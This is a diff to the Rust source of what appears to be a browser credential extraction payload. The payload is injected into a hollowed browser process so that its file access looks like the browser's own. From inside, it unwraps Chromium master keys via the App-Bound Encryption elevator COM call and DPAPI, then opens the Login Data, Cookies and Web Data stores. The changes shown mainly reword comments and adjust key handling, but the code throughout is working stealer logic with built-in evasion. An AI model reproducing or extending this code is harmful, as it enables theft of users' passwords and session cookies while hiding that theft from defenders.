@@ -5,16 +5,16 @@
 //!
 //! Everything sensitive happens here, in a process whose image path IS the
 //! browser: reading `Local State`, unwrapping the master keys (the ABE
-//! elevator COM call — which requires this identity — and DPAPI), and
-//! opening `Login Data`/`Cookies`/`Web Data`. To any observer, the browser is
-//! reading its own profile.
+//! elevator COM call, which requires this identity, and DPAPI) and opening
+//! `Login Data`/`Cookies`/`Web Data`. To any observer the browser is reading
+//! its own profile.
 //!
 //! The payload is its own trust boundary: it re-validates the request's
 //! config BEFORE any secret is touched (the injector's checks are not relied
 //! on), and every frame it emits carries the per-run auth token plus a
 //! sequence number. Detection is the mailbox marker pair:
 //! both environment variables must be present (one stray variable must never
-//! flip a normal process into payload mode). This code stays silent — the
+//! flip a normal process into payload mode). This code stays silent; the
 //! hollowed process inherited the browser's stdio.
 #![allow(unsafe_code)]
 
@@ -63,11 +63,8 @@ fn payload_main() -> anyhow::Result<()> {
     let page = unsafe { std::slice::from_raw_parts(base as *const u8, postbox::MAILBOX_SIZE) };
     let (raw_request, _response) =
         postbox::split_page(page).ok_or_else(|| anyhow::anyhow!("mailbox marker missing"))?;
-    let (browser_id, blob) =
+    let request =
         postbox::decode_request(raw_request).ok_or_else(|| anyhow::anyhow!("request malformed"))?;
-    let mut request =
-        postbox::decode_blob(&blob).ok_or_else(|| anyhow::anyhow!("request blob malformed"))?;
-    request.browser_id = browser_id;
     let token = wire::hex_encode(&request.token);
 
     // Fatal-error reporting when the pipe itself is unreachable: post the
@@ -98,10 +95,10 @@ fn run_exchange(request: &postbox::Request, token: &str) -> anyhow::Result<()> {
     let pipe = Client::connect(&pipe_name, Duration::from_secs(10))?;
     let mut emitter = Emitter::new(token);
 
-    // CONFIG RE-VALIDATION FIRST: re-check the request at this trust boundary
-    // — before reading Local State or calling DPAPI/COM. The injector only
-    // launches payloads for decryption-enabled, selected browsers, but the
-    // payload does not rely on that.
+    // CONFIG RE-VALIDATION FIRST: re-check the request at this trust
+    // boundary before reading Local State or calling DPAPI/COM. The injector
+    // only launches payloads for decryption-enabled, selected browsers, but
+    // the payload does not rely on that.
     let opts: RunOptions = serde_json::from_str(&request.options_json).unwrap_or_default();
     if !opts.decrypt || !opts.wants_browser(&request.browser_id) {
         send(
@@ -131,7 +128,7 @@ fn run_exchange(request: &postbox::Request, token: &str) -> anyhow::Result<()> {
     )?;
     if bag.is_empty() {
         // Report the failure so the injector treats the attempt as failed and
-        // falls back to local counts-only — a bare `done` would read as a
+        // falls back to local counts-only. A bare `done` would read as a
         // successful extraction of NOTHING, silently zeroing every count.
         send(
             &pipe,
@@ -218,7 +215,7 @@ fn resolve_keys(browser: &Browser) -> (KeyBag, String) {
         match &browser.abe {
             Some(identity) => match elevator::unwrap(identity, blob) {
                 Ok(raw) if raw.len() == 32 => {
-                    bag.app_bound = crate::crypt::bag_key32(raw);
+                    bag.app_bound = Some(crate::crypt::bag_key32(raw));
                     notes.push("abe".to_string());
                 }
                 Ok(_) => {
@@ -232,7 +229,7 @@ fn resolve_keys(browser: &Browser) -> (KeyBag, String) {
     if let Some(blob) = &wrapped.dpapi {
         match dpapi::unprotect(blob) {
             Ok(raw) if raw.len() == 32 => {
-                bag.dpapi = crate::crypt::bag_key32(raw);
+                bag.dpapi = Some(crate::crypt::bag_key32(raw));
                 notes.push("dpapi".to_string());
             }
             Ok(_) => notes.push("error: DPAPI returned an unexpected key length".to_string()),
